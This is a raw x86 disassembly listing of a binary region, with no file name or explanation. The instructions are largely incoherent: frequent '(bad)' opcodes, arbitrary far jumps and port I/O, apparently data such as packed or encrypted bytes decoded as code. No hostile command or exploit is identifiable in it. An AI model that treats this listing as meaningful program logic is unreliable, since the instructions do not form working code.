  40fdac:	aad    0xe2
  40fdae:	mov    esp,eax
  40fdb0:	inc    edx
  40fdb1:	popa   
  40fdb2:	retf   
  40fdb3:	pop    ebp
  40fdb4:	dec    ecx
  40fdb5:	mov    al,0xab
  40fdb7:	ds xor eax,0xfb172675
  40fdbd:	stc    
  40fdbe:	add    BYTE PTR [edx],bh
  40fdc0:	fisttp WORD PTR [edi+0x71]
  40fdc3:	cld    
  40fdc4:	and    al,0x19
  40fdc6:	mov    eax,ds:0xf6026fc
  40fdcb:	sub    al,0x41
  40fdcd:	or     eax,0x751490dd
  40fdd2:	inc    ecx
  40fdd3:	(bad)  
  40fdd4:	pop    esp
  40fdd5:	sbb    esi,DWORD PTR [edx+0x49]
  40fdd8:	inc    eax
  40fdd9:	fcomp  QWORD PTR [edx+0xe830613]
  40fddf:	(bad)  
  40fde0:	mov    ds:0x21997cc1,al
  40fde5:	add    eax,0x72397c84
  40fdea:	pop    ebp
  40fdeb:	or     DWORD PTR [edi-0x29],ebp
  40fdee:	retf   0x33fd
  40fdf1:	sub    esp,DWORD PTR [edi-0x2db88d67]
  40fdf7:	add    ecx,DWORD PTR [edi]
  40fdf9:	into   
  40fdfa:	mov    ebx,0xde6f30e3
  40fdff:	lds    esi,FWORD PTR ds:0x72db3b0b
  40fe05:	and    ecx,edi
  40fe07:	or     BYTE PTR [ecx+ebx*4-0x3a],ch
  40fe0b:	push   ss
  40fe0c:	jo     0x40fe4c
  40fe0e:	fcmovnbe st,st(2)
  40fe10:	dec    esp
  40fe11:	sub    BYTE PTR ds:0x46020816,dl
  40fe17:	inc    ebx
  40fe18:	xchg   ebp,eax
  40fe19:	cwde   
  40fe1a:	ins    BYTE PTR es:[edi],dx
  40fe1b:	pop    esi
  40fe1c:	push   ebx
  40fe1d:	mov    ebx,0x7dc2f561
  40fe22:	pop    ebp
  40fe23:	repnz push 0xffffff9a
  40fe26:	mov    dh,BYTE PTR [ebx*4-0xa361220]
  40fe2d:	and    al,0xca
  40fe2f:	xchg   edx,eax
  40fe30:	and    eax,0xe47232b8
  40fe35:	xlat   BYTE PTR ds:[ebx]
  40fe36:	cmp    al,0xe0
  40fe38:	imul   eax,DWORD PTR [ebx+0xab6b442],0x12c7e35e
  40fe42:	xor    al,0xbe
  40fe44:	dec    esp
  40fe45:	mov    ecx,0xb2f9e89b
  40fe4a:	jmp    0x40fe37
  40fe4c:	loop   0x40fe2c
  40fe4e:	mov    dh,0xd6
  40fe50:	lods   al,BYTE PTR ss:[esi]
  40fe52:	cli    
  40fe53:	mov    cs,WORD PTR [ecx-0x5d8af192]
  40fe59:	mov    cs,WORD PTR [edi+0x573fcabb]
  40fe5f:	add    dh,BYTE PTR [ebx-0x395e56bb]
  40fe65:	arpl   si,ax
  40fe67:	ficomp WORD PTR [ebp-0x2f766830]
  40fe6d:	sub    al,dh
  40fe6f:	sbb    bh,BYTE PTR [ebp-0x3e]
  40fe72:	fidiv  DWORD PTR [ecx-0x27]
  40fe75:	popf   
  40fe76:	add    dh,BYTE PTR [eax+0x2d]
  40fe79:	mov    dh,0x4
  40fe7b:	arpl   WORD PTR [edi+eiz*8-0x783af8d9],dx
  40fe82:	and    cl,al
  40fe84:	inc    edx
  40fe85:	sub    al,0x65
  40fe87:	sub    BYTE PTR ds:0x3b82,bh
  40fe8c:	mov    ebp,0xb094bb2d
  40fe91:	dec    ebp
  40fe92:	dec    ecx
  40fe93:	jbe    0x40fe85
  40fe95:	cmp    bh,cl
  40fe97:	enter  0xb021,0x16
  40fe9b:	(bad)  
  40fe9d:	das    
  40fe9e:	xor    BYTE PTR [edi-0x78],ch
  40fea1:	xchg   esp,eax
  40fea2:	jmp    0x8f5b:0xb5ba36ca
  40fea9:	mov    dl,0xb5
  40feab:	ja     0x40fe67
  40fead:	out    dx,eax
  40feae:	pop    eax
  40feaf:	out    dx,eax
  40feb0:	jmp    0x40fe76
  40feb2:	neg    DWORD PTR [edi-0xc0f1da5]
  40feb8:	pop    ebp
  40feb9:	mov    cl,BYTE PTR ds:0xb449b799
  40febf:	ja     0x40fec7
  40fec1:	int    0x85
  40fec3:	aas    
  40fec4:	mov    edi,0x6ee1472b
  40fec9:	mov    al,ds:0xffac5739
  40fece:	cld    
  40fecf:	ficomp WORD PTR [esi]
  40fed1:	in     eax,dx
  40fed2:	daa    
  40fed3:	popa   
  40fed4:	jmp    0xb895:0x5043a299
  40fedb:	inc    ecx
  40fedc:	sbb    dl,BYTE PTR [ebp-0x6e9a8f44]
  40fee2:	aaa    
  40fee3:	test   eax,0x59e4798c
  40fee8:	jmp    0x40ff1a
  40feea:	call   0xa38b68fd
  40feef:	hlt    
  40fef0:	sahf   
  40fef1:	cwde   
  40fef2:	sub    eax,0x60714ed4
  40fef7:	jle    0x40fe83
  40fef9:	pop    ecx
  40fefa:	cmp    al,0x23
  40fefc:	add    DWORD PTR [ebx],edi
  40fefe:	(bad)
  40ff01:	(bad)  
  40ff02:	jmp    0x198:0xe4d068fc
  40ff09:	(bad)  
  40ff0a:	lods   eax,DWORD PTR ds:[esi]
  40ff0b:	and    DWORD PTR [esi+0x1f59b294],ebp
  40ff11:	jmp    0x561d:0x571d4542
  40ff18:	jge    0x40feaf
  40ff1a:	loope  0x40ff80
  40ff1c:	div    BYTE PTR [ebx-0x2e]
  40ff1f:	in     eax,0x47
  40ff21:	in     al,dx
  40ff22:	into   
  40ff23:	out    dx,eax
  40ff24:	pop    eax
  40ff26:	and    esi,eax
  40ff28:	push   esi
  40ff29:	mov    dl,0xfe
  40ff2b:	std    
  40ff2c:	and    BYTE PTR [ebx+ecx*4],0x66
  40ff30:	int3   
  40ff31:	pop    ebx
  40ff32:	es jmp 0x8b3856b0
  40ff38:	pushf  
  40ff39:	ins    DWORD PTR es:[edi],dx
  40ff3a:	and    bh,BYTE PTR [edx+0xc]
  40ff3d:	sbb    al,0x60
  40ff3f:	jno    0x40ff92
  40ff41:	add    BYTE PTR [edi+0x46f0c57e],bl
  40ff47:	stc    
  40ff48:	push   eax
  40ff49:	cli    
  40ff4a:	and    BYTE PTR [ebp+0x70c0cfff],0xe9
  40ff51:	mov    ch,0xf0
  40ff53:	daa    
  40ff54:	mov    eax,0x25f5d24
  40ff59:	aam    0x3d
  40ff5b:	cmp    DWORD PTR [ebx-0x1c],esi
  40ff5e:	ret    0x1971
  40ff61:	mov    cl,0xe2
  40ff63:	jmp    0xa99d:0xe80de26a
  40ff6a:	xor    DWORD PTR [ecx+0x71],esi
  40ff6d:	retf   0x8ee2
  40ff70:	popa   
  40ff71:	lds    ebp,FWORD PTR [ecx-0x37]
  40ff74:	rol    DWORD PTR [esi],0xf8
  40ff77:	or     DWORD PTR [ecx+0xc83e077],esp
  40ff7d:	sub    cl,BYTE PTR [edi-0x5d]
  40ff80:	bound  ebx,QWORD PTR [ecx+0x6e432707]
  40ff86:	stc    
  40ff87:	mov    ah,0x58
  40ff89:	xchg   si,ax
  40ff8b:	mov    esi,0x3b7a1c46
  40ff90:	call   0x94e4:0x13290cf4
  40ff97:	xor    BYTE PTR [ecx],ah
  40ff99:	sbb    DWORD PTR [edi+0x2de36484],ebx
  40ff9f:	adc    eax,0xb100a42e
  40ffa4:	clc    
  40ffa5:	adc    al,0x70
  40ffa7:	cmc    
  40ffa8:	push   ds
  40ffa9:	cmp    al,0x3d
  40ffab:	cmp    eax,0x40b33848
  40ffb0:	mov    ds:0x54a7e400,al
  40ffb5:	ja     0x40ff98
  40ffb7:	retf   
  40ffb8:	out    dx,al
  40ffb9:	fmulp  st(4),st
  40ffbb:	shr    BYTE PTR [edx-0x28],cl
  40ffbe:	xor    ebx,DWORD PTR [ebp+0x47]
  40ffc1:	adc    edi,DWORD PTR [ecx]
  40ffc3:	ja     0x40ffc1
  40ffc5:	aaa    
  40ffc6:	loope  0x40fff9
  40ffc8:	stos   BYTE PTR es:[edi],al
  40ffc9:	dec    DWORD PTR [edi]
  40ffcb:	sahf   
  40ffcc:	and    WORD PTR [ebx],0xffc8
  40ffd0:	mov    ah,BYTE PTR [esi]
  40ffd2:	cdq    
  40ffd3:	scas   eax,DWORD PTR es:[edi]
  40ffd4:	or     BYTE PTR [eax-0x1d],0x74
  40ffd8:	mov    ebx,0x18785a04
  40ffdd:	xlat   BYTE PTR ds:[ebx]
  40ffde:	stos   DWORD PTR es:[edi],eax
  40ffdf:	and    DWORD PTR [eax+0x7235f4b4],0x1a
  40ffe6:	sbb    BYTE PTR [esi+edi*4-0x5a],0x6f
  40ffeb:	pop    esi
  40ffec:	xor    DWORD PTR [eax],ebx
  40ffee:	nop
  40ffef:	in     eax,dx
  40fff0:	aaa    
  40fff1:	sbb    al,BYTE PTR [ecx]
  40fff3:	lock das 
  40fff5:	xrelease mov BYTE PTR [edi],bl
  40fff8:	fstp   QWORD PTR [esi]
  40fffa:	sar    dh,cl
  40fffc:	adc    esp,DWORD PTR [esi-0x8]
  40ffff:	je     0x40ffff
  410001:	push   ebx
  410002:	xchg   DWORD PTR [edx+0x189d2942],ebp
  410008:	leave  
  410009:	or     ch,bh
  41000b:	rcl    DWORD PTR [ecx+edi*1+0x4c],cl
  41000f:	sbb    dl,BYTE PTR [ecx]
  410011:	push   ss
  410012:	jg     0x41001b
  410014:	mov    eax,0x34659cac
  410019:	pop    edx
  41001a:	imul   esi,DWORD PTR [ecx+0x1f],0x7fd6b85c
  410021:	sbb    dl,ch
  410023:	mov    ?,WORD PTR [eax*1-0x5c5b6484]
  41002a:	mov    ds:0xaf73c6b0,al
  41002f:	aaa    
  410030:	pop    ss
  410031:	mov    ds:0xadf28bbc,eax
  410036:	retf   0x2222
  410039:	fs jmp 0x34ff:0xd0c0dd7e
  410041:	aaa    
  410042:	int    0xa3
  410044:	adc    DWORD PTR [eax],0x2
  410047:	xchg   edx,eax
  410048:	test   al,0x7
  41004a:	imul   ecx,DWORD PTR [ecx-0x2f],0xffffff83
  41004e:	cmp    DWORD PTR [ebp-0x79],0x58
  410052:	lea    eax,[ebx]
  410054:	sub    ebx,DWORD PTR [ebx]
  410056:	test   al,0x98
  410059:	ror    BYTE PTR [ecx+0x16bcf70],1
  41005f:	pop    edi
  410060:	fmul   st,st(0)
  410062:	ss jmp 0x97ccd7c3
  410068:	je     0x4100b1
  41006a:	xchg   ebx,ebx
  41006c:	ins    DWORD PTR es:[edi],dx
  41006d:	outs   dx,DWORD PTR ds:[esi]
  41006e:	jmp    0x7f4c:0xea790b5a
  410075:	mov    esi,0xab40402f
  41007a:	out    0xee,al
  41007c:	pop    eax
  41007d:	xlat   BYTE PTR ds:[ebx]
  41007e:	aas    
  41007f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410080:	shl    esp,0xdf
  410083:	(bad)  
  410084:	cmp    DWORD PTR [edx],edi
  410086:	sub    al,0x54
  410088:	cwde   
  410089:	push   edx
  41008a:	adc    eax,0xf6fb105
  41008f:	pop    esp
  410090:	add    bl,cl
  410092:	adc    eax,0x6c2057a2
  410097:	shl    ch,1
  410099:	ficomp DWORD PTR [ebx+ebp*1]
  41009c:	jno    0x41011a
  41009e:	cmc    
  41009f:	add    ch,BYTE PTR [esi-0x579cc0e1]
  4100a5:	test   DWORD PTR [edi+0x2bab6f44],0xaccae7ee
  4100af:	cdq    
  4100b0:	mov    eax,ds:0xdb4590d6
  4100b5:	aam    0x17
  4100b7:	neg    DWORD PTR [ebx+0x49]
  4100ba:	jmp    0x3a3cd71c
  4100bf:	in     eax,0xb7
  4100c1:	retf   0xd7e3
  4100c4:	mov    al,0x17
  4100c6:	mov    bh,0xc2
  4100c8:	nop
  4100c9:	(bad)  [esi+0x12]
  4100cc:	inc    eax
  4100cd:	sbb    al,0x8
  4100cf:	push   dx
  4100d1:	inc    edx
  4100d2:	popf   
  4100d3:	inc    esi
  4100d4:	pushf  
  4100d5:	fisttp DWORD PTR [edi-0x10fb7202]
  4100db:	ja     0x410101
  4100dd:	bound  esi,QWORD PTR [ebx+ecx*1-0x44]
  4100e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4100e2:	mov    cl,BYTE PTR [esi-0x15]
  4100e5:	je     0x4100fd
  4100e7:	out    dx,eax
  4100e8:	jg     0x410108
  4100ea:	cmp    al,0xb6
  4100ec:	js     0x410128
  4100ee:	mov    eax,0xae13b84f
  4100f3:	test   al,0xa9
  4100f5:	into   
  4100f6:	cmp    BYTE PTR [eax+0x2f],bh
  4100f9:	sbb    bh,BYTE PTR [eax+0x67c1b1e4]
  4100ff:	xchg   ebx,eax
  410100:	push   edx
  410101:	pop    ebx
  410102:	mul    DWORD PTR [edx]
  410104:	lods   al,BYTE PTR ds:[esi]
  410105:	push   ds
  410106:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410107:	arpl   WORD PTR [ebx+0x3c841288],di
  41010d:	mov    esi,0x83310d32
  410112:	push   es
  410113:	lods   al,BYTE PTR ds:[esi]
  410114:	xor    BYTE PTR [edx+0x7d],dh
  410117:	or     ch,BYTE PTR [esi+0x3]
  41011a:	(bad)  
  41011b:	hlt    
  41011c:	push   cs
  41011d:	bound  ebp,QWORD PTR [esp+edx*4-0x4aac154e]
  410124:	repz rol al,0x6
  410128:	call   0x8800:0xd4d7000f
  41012f:	aaa    
  410130:	xchg   DWORD PTR [ebx+0x2be133f],ecx
  410136:	push   edx
  410137:	push   0x1c334007
  41013c:	call   0xd56a:0x1f24975e
  410143:	jbe    0x4101a5
  410145:	mov    bl,0xc
  410147:	addr16 mov ah,0x1a
  41014a:	repnz pop esp
  41014c:	fidiv  DWORD PTR [ebx]
  41014e:	arpl   WORD PTR [edi+ebp*8],dx
  410151:	fst    st(6)
  410153:	sbb    bh,BYTE PTR [edi+0x4e274415]
  410159:	cdq    
  41015a:	xor    eax,0x6a191b92
  41015f:	pop    ebp
  410160:	pop    edx
  410161:	jmp    0x410135
  410163:	cmp    dl,BYTE PTR [edi+0x63e4ac10]
  410169:	gs pop ss
  41016b:	stc    
  41016c:	lahf   
  41016d:	leave  
  41016e:	cmp    DWORD PTR [esi-0x71],edx
  410171:	lds    edi,FWORD PTR cs:[eax+ebp*4]
  410175:	inc    ebx
  410176:	nop
  410177:	test   DWORD PTR [ebx-0xd27e73b],0xc218be71
  410181:	jmp    0xcded7ce7
  410186:	mov    al,0x0
  410188:	xor    ch,BYTE PTR [esi+0x28]
  41018b:	mov    eax,0xf251e172
  410190:	divps  xmm5,XMMWORD PTR [ebx]
  410193:	mov    ds:0x789ddd0f,al
  410198:	mov    dh,0xcd
  41019a:	dec    esp
  41019b:	ret    
  41019c:	xchg   ebp,eax
  41019d:	add    eax,0xa66454c1
  4101a2:	push   ebp
  4101a3:	push   esi
  4101a4:	es mov ebp,0x12315439
  4101aa:	cmp    BYTE PTR [ebx+0x4b95a6aa],ah
  4101b0:	dec    edi
  4101b1:	or     al,0x4e
  4101b3:	adc    al,cl
  4101b5:	mov    ds:0xe52480ff,eax
  4101ba:	es mov edx,0x44bbc8
  4101c0:	dec    edx
  4101c1:	adc    eax,ebp
  4101c3:	loop   0x410241
  4101c5:	and    DWORD PTR [esp+ebp*8-0x3a],eax
  4101c9:	scas   eax,DWORD PTR es:[edi]
  4101ca:	rol    BYTE PTR [eax],cl
  4101cc:	jp     0x4101b8
  4101ce:	push   cs
  4101cf:	inc    edx
  4101d0:	mov    eax,ds:0x42f2f04b
  4101d5:	jp     0x410243
  4101d7:	loope  0x41024a
  4101d9:	and    al,0x85
  4101db:	pop    esi
  4101dc:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  4101de:	or     edi,0x1603422f
  4101e4:	inc    DWORD PTR [ebp+0x3f]
  4101e7:	mov    ah,0xa
  4101e9:	or     esi,ebx
  4101eb:	popf   
  4101ec:	in     eax,0xf5
  4101ee:	mov    cl,0x38
  4101f0:	xor    eax,0xd2c35f2d
  4101f5:	jae    0x41024a
  4101f7:	push   ebx
  4101f8:	fldenv [ebp+0xc73b55c]
  4101fe:	stos   DWORD PTR es:[edi],eax
  4101ff:	loop   0x410206
  410201:	mov    ecx,0x8b4a32e8
  410206:	sahf   
  410207:	adc    dh,BYTE PTR [esi+0x3]
  41020a:	pusha  
  41020b:	mov    ebp,DWORD PTR [edx+eiz*8]
  41020e:	inc    ebx
  41020f:	sti    
  410210:	shl    esp,cl
  410212:	cmp    DWORD PTR [eax+0x733bd05],esi
  410218:	outs   dx,DWORD PTR ds:[esi]
  410219:	dec    eax
  41021a:	sbb    eax,0x4f2ed449
  41021f:	mov    ds:0x9bb5d996,al
  410224:	fcom   st(4)
  410226:	mov    cl,BYTE PTR [edx+0x63]
  410229:	hlt    
  41022a:	push   ss
  41022b:	push   esp
  41022c:	push   edx
  41022d:	jne    0x4101e1
  41022f:	call   0xf85b:0x6bbb9fb5
  410236:	xchg   esi,eax
  410237:	mov    ebp,0xab613b97
  41023c:	into   
  41023d:	adc    al,0x45
  41023f:	imul   esi,DWORD PTR [eax-0x69f1443f],0x4655a069
  410249:	or     bl,BYTE PTR [eax]
  41024b:	jg     0x4101eb
  41024d:	cs sbb eax,0x2d949bf2
  410253:	lods   eax,DWORD PTR ds:[esi]
  410254:	mov    ah,BYTE PTR [eax+0x51211f40]
  41025a:	(bad)  
  41025b:	icebp  
  41025c:	fnsave [ebx]
  41025e:	cmp    al,0x4d
  410260:	(bad)  
  410261:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410262:	xchg   esp,eax
  410263:	dec    ebp
  410264:	int    0x44
  410266:	mov    ecx,0xe2906ea9
  41026b:	into   
  41026c:	fmul   DWORD PTR [eax-0x56fe212e]
  410272:	mov    eax,0xac3d59c4
  410277:	push   edi
  410278:	mov    ds:0x58f5ea51,eax
  41027d:	mov    edi,0x2a97cb6b
  410282:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410283:	fisttp WORD PTR [eax+ebp*2]
  410286:	pop    ebx
  410287:	nop
  410288:	repnz mov ch,0x77
  41028b:	push   edx
  41028c:	inc    ebp
  41028d:	mov    ds:0x7271a146,eax
  410292:	xor    DWORD PTR [ebx+0x23a5864f],ecx
  410298:	fwait
  410299:	or     DWORD PTR [ecx-0x6b],esi
  41029c:	and    bh,BYTE PTR [eax-0x2d183c0f]
  4102a2:	imul   ebp,DWORD PTR [edi],0x42
  4102a5:	sub    BYTE PTR ds:0x9a3c4f49,ah
  4102ab:	xchg   BYTE PTR [ebp-0x544488b7],dl
  4102b1:	outs   dx,BYTE PTR ds:[esi]
  4102b2:	push   esp
  4102b3:	das    
  4102b4:	xor    ebx,DWORD PTR [edi-0x5f]
  4102b7:	mov    dh,BYTE PTR [edi]
  4102b9:	(bad)  
  4102bb:	cmc    
  4102bc:	fnstcw WORD PTR [edx+0x5d]
  4102bf:	shl    DWORD PTR [edx-0x66d83318],0x9a
  4102c6:	jno    0x410290
  4102c8:	jl     0x410273
  4102ca:	rol    DWORD PTR [eax+0x32a2b9ed],cl
  4102d0:	call   0x60f9:0xcb983b97
  4102d7:	lds    edx,FWORD PTR [eax+0x5c4bf288]
  4102dd:	aam    0xda
  4102df:	fcom   QWORD PTR [edx-0xcee5cb7]
  4102e5:	dec    ebx
  4102e6:	xchg   ebp,eax
  4102e7:	adc    BYTE PTR [ebx-0x39],0x8d
  4102eb:	xor    DWORD PTR [eax+0x6],esp
  4102ee:	cmp    eax,DWORD PTR [edx+0x21023ed1]
  4102f4:	cli    
  4102f5:	or     eax,0xeedd6e99
  4102fa:	adc    al,0xec
  4102fc:	(bad)  
  4102fe:	add    BYTE PTR [esp+edx*4-0x70721c7b],al
  410305:	call   0xafb0:0x540bdb50
  41030c:	sahf   
  41030d:	add    al,BYTE PTR [ebx+edx*4]
  410310:	dec    edi
  410311:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410312:	sbb    al,0x84
  410314:	aad    0x15
  410316:	mov    cl,0x4c
  410318:	adc    edx,DWORD PTR [edx]
  41031a:	mov    DWORD PTR [esp+edi*8],edx
  41031d:	sbb    dl,BYTE PTR [esi+0x4cd96aff]
  410323:	hlt    
  410324:	and    eax,DWORD PTR [ebx-0x3bb1f24f]
  41032a:	fcom   DWORD PTR [ebp-0x5c]
  41032d:	jae    0x410374
  41032f:	fmulp  st(0),st
  410331:	xlat   BYTE PTR ds:[ebx]
  410332:	inc    edi
  410333:	inc    eax
  410334:	sub    eax,ecx
  410336:	test   DWORD PTR [ebp-0x4a58edcb],edx
  41033c:	call   0x3628:0xd9d15c00
  410343:	push   cs
  410344:	sub    cl,BYTE PTR [edi-0x402384c4]
  41034a:	call   ecx
  41034c:	loopne 0x410387
  41034e:	push   ebx
  41034f:	int3   
  410350:	aas    
  410351:	call   0xc77d61dd
  410356:	es (bad) 
  410358:	sub    DWORD PTR [ebx-0x68],esp
  41035b:	loop   0x410324
  41035d:	jae    0x410347
  41035f:	xor    dl,BYTE PTR [edi]
  410361:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410362:	(bad)  
  410363:	xor    ebx,esp
  410365:	ins    BYTE PTR es:[edi],dx
  410366:	retf   0x9041
  410369:	(bad)  
  41036a:	int3   
  41036b:	push   esp
  41036c:	mov    ebx,0x25f1be13
  410371:	lods   al,BYTE PTR ds:[esi]
  410372:	rcr    ah,cl
  410374:	xchg   edi,eax
  410375:	jae    0x41038f
  410377:	mov    cs,WORD PTR [ebx]
  410379:	or     ch,cl
  41037b:	xlat   BYTE PTR ds:[ebx]
  41037c:	or     DWORD PTR [eax-0x7d],edi
  41037f:	ins    DWORD PTR es:[edi],dx
  410380:	shl    edx,1
  410382:	pop    ds
  410383:	cmc    
  410384:	add    DWORD PTR [edx+0x2f],0x8260e58
  41038b:	nop
  41038c:	add    al,cl
  41038e:	sbb    bh,BYTE PTR [esi-0x5b4d4b22]
  410394:	dec    ebp
  410395:	in     al,0x1c
  410397:	iret   
  410398:	mov    ebp,0xeeb01761
  41039d:	adc    edi,DWORD PTR [edi-0x4f]
  4103a0:	fsin   
  4103a2:	ja     0x410420
  4103a4:	ret    
  4103a5:	mov    edx,0x1b2bfe45
  4103aa:	adc    bl,ch
  4103ac:	pop    edx
  4103ad:	dec    esi
  4103ae:	mul    BYTE PTR [ebx+esi*1-0x3f]
  4103b2:	or     esp,DWORD PTR [esi]
  4103b4:	mov    ds:0x3935abb0,al
  4103b9:	cmp    DWORD PTR [eax-0x63],esp
  4103bc:	cld    
  4103bd:	mov    esi,fs
  4103bf:	pop    esi
  4103c0:	xlat   BYTE PTR ds:[bx]
  4103c2:	jo     0x4103db
  4103c4:	ja     0x410353
  4103c6:	rol    DWORD PTR [eax-0x41e2f8fc],0x91
  4103cd:	cmp    eax,0x3a7e9805
  4103d2:	js     0x4103a5
  4103d4:	xor    esp,DWORD PTR [eax]
  4103d6:	ja     0x410406
  4103d8:	repnz fwait
  4103da:	sbb    ebp,DWORD PTR ds:0xd51e3248
  4103e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4103e1:	imul   BYTE PTR [edx+0x66]
  4103e4:	mov    eax,0xa9842faa
  4103e9:	test   al,0x4f
  4103eb:	mov    al,0xa3
  4103ed:	push   edi
  4103ee:	jl     0x4103d2
  4103f0:	or     DWORD PTR [edx+ebx*2-0x7b],eax
  4103f4:	rcl    DWORD PTR [edx-0x79b9372e],0x7a
  4103fb:	pop    ecx
  4103fc:	cmp    ebp,DWORD PTR [eax]
  4103fe:	mov    bh,0x39
  410400:	and    al,0x5e
  410402:	ins    DWORD PTR es:[edi],dx
  410403:	sbb    eax,0xdb66cc4f
  410408:	(bad)  
  410409:	xor    BYTE PTR [ebx-0x21],dl
  41040c:	pop    edx
  41040d:	(bad)  
  41040e:	jo     0x4103e4
  410410:	rcl    DWORD PTR [ebp+0xc5097c3],0xcd
  410417:	pop    esp
  410418:	lea    esi,[edx-0x32c44996]
  41041e:	(bad)  
  410420:	pop    ebp
  410421:	push   0x68beb4a8
  410426:	fistp  QWORD PTR [ebx-0x46c9e34b]
  41042c:	cmp    DWORD PTR [eax-0xa6443cb],edx
  410432:	repnz or esi,edx
  410435:	int    0xc6
  410437:	(bad)  
  410438:	aam    0x7e
  41043a:	stos   BYTE PTR es:[edi],al
  41043b:	jns    0x410471
  41043d:	cs test al,0x18
  410440:	fs inc edi
  410442:	jnp    0x4104b9
  410444:	(bad)  
  410445:	cs cld 
  410447:	(bad)
  41044b:	lds    ecx,FWORD PTR [edi]
  41044d:	leave  
  41044e:	push   esp
  41044f:	and    BYTE PTR [edx+edx*4-0x44dc0dc4],cl
  410456:	leave  
  410457:	dec    ebp
  410458:	aaa    
  410459:	(bad)  
  41045a:	cld    
  41045b:	ins    DWORD PTR es:[edi],dx
  41045c:	adc    ebp,ebp
  41045e:	test   al,0x8e
  410460:	(bad)  
  410461:	cmp    edx,DWORD PTR [ebx+0x1c]
  410464:	in     eax,dx
  410465:	cmp    BYTE PTR [edx],ah
  410467:	sbb    BYTE PTR [esi+0x79],dh
  41046a:	push   esi
  41046b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41046c:	jecxz  0x4104e3
  41046e:	push   esi
  41046f:	cli    
  410470:	push   edx
  410471:	or     ebx,DWORD PTR [ecx+0x4b]
  410474:	or     ecx,edx
  410476:	adc    BYTE PTR [ebx-0x2b],0x61
  41047a:	sub    esp,DWORD PTR [edx]
  41047c:	(bad)  
  41047d:	lahf   
  41047e:	xchg   esp,eax
  41047f:	or     al,0xac
  410481:	add    al,0x59
  410483:	jne    0x4104d8
  410485:	jle    0x410442
  410487:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410488:	push   ebx
  410489:	xchg   ebp,eax
  41048a:	mov    esp,0xfd3233cc
  41048f:	inc    esp
  410490:	sub    eax,0xc4a43e2b
  410495:	xor    al,0xb6
  410497:	ins    BYTE PTR es:[edi],dx
  410498:	push   esp
  410499:	and    eax,0x0
	...
  410512:	add    BYTE PTR [eax],al
  410514:	imul   eax,DWORD PTR gs:[ebx+0x6def8fef],0xffffffeb
  41051c:	pop    edx
  41051d:	sar    ecx,cl
  41051f:	sbb    ecx,DWORD PTR [esi-0x7ee162c4]
  410525:	mov    al,0x0
  410527:	add    BYTE PTR [esi+0x7],ch
  41052a:	add    BYTE PTR [eax],al
  41052c:	lods   al,BYTE PTR ds:[esi]
  41052d:	push   esp
  41052e:	or     bh,cl
  410530:	push   es
  410531:	(bad)  
  410532:	jmp    0x41051e
  410534:	xchg   ecx,eax
  410535:	lahf   
  410536:	stos   DWORD PTR es:[edi],eax
  410537:	push   esi
  410538:	lds    edx,FWORD PTR [edx]
  41053a:	loopne 0x41050c
  41053c:	out    dx,eax
  41053d:	sub    DWORD PTR [ebp-0xc],0xffffffac
  410541:	cld    
  410542:	in     al,dx
  410543:	mov    ch,0x85
  410545:	sti    
  410546:	jno    0x410566
  410548:	inc    edx
  410549:	mov    DWORD PTR [ecx],edi
  41054b:	jno    0x410526
  41054d:	xchg   edi,eax
  41054e:	int3   
  41054f:	and    DWORD PTR [eax-0x79],eax
  410552:	push   edi
  410553:	sub    al,0x2b
  410555:	test   eax,0x29954dfa
  41055a:	repnz dec ecx
  41055c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41055d:	out    0x4,eax
  41055f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410560:	mov    ch,0x42
  410562:	sbb    al,al
  410564:	inc    ecx
  410565:	neg    BYTE PTR [ecx]
  410567:	dec    esp
  410568:	push   edx
  410569:	dec    edi
  41056a:	test   DWORD PTR [edi+0x6347202],0xfb614924
  410574:	adc    DWORD PTR ds:[esi+0x44],ebx
  410578:	cmc    
  410579:	xchg   ebp,eax
  41057a:	or     BYTE PTR [ecx],0xc3
  41057d:	dec    esp
  41057e:	rol    edx,1
  410580:	mov    al,ds:0x2f476218
  410585:	sbb    BYTE PTR [esi],dh
  410587:	jg     0x4105c2
  410589:	mov    eax,0xa0c9a170
  41058e:	mov    ebx,0x748fd059
  410593:	je     0x41052c
  410595:	jne    0x41053c
  410597:	xchg   DWORD PTR [ebp-0x6d],ebx
  41059a:	and    al,0x2
  41059c:	mov    ebp,DWORD PTR [ebp+0x6c]
  41059f:	test   al,0x69
  4105a1:	pop    ebx
  4105a2:	pop    ebx
  4105a3:	scas   eax,DWORD PTR es:[edi]
  4105a4:	repz xlat BYTE PTR ds:[ebx]
  4105a6:	sub    BYTE PTR [ecx+0x66d21391],ah
  4105ac:	test   al,dl
  4105ae:	push   es
  4105af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4105b0:	loop   0x410609
  4105b2:	scas   eax,DWORD PTR es:[edi]
  4105b3:	addr16 int 0xc0
  4105b6:	adc    BYTE PTR [ebp+0x105c6fbb],bh
  4105bc:	cld    
  4105bd:	push   edi
  4105be:	scas   eax,DWORD PTR es:[edi]
  4105bf:	enter  0x8af6,0x12
  4105c3:	or     esp,DWORD PTR [edx+0x4bcd9580]
  4105c9:	in     eax,dx
  4105ca:	imul   edi,ebx,0x3c016729
  4105d0:	das    
  4105d1:	fld    QWORD PTR [edi+0xc]
  4105d4:	push   ecx
  4105d5:	ficomp WORD PTR [edi]
  4105d7:	neg    DWORD PTR [di-0x3985]
  4105dc:	je     0x4105af
  4105de:	sbb    al,0xaf
  4105e0:	fidivr WORD PTR [eax]
  4105e2:	dec    edi
  4105e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4105e4:	and    eax,0x18e3e513
  4105e9:	add    eax,0xf2cfed1d
  4105ee:	push   ss
  4105ef:	push   es
  4105f0:	mov    dh,0xe8
  4105f2:	or     edi,DWORD PTR [ebx-0x42]
  4105f5:	cmp    DWORD PTR [ebp+ecx*2+0x3cd38bf8],0xe6f64379
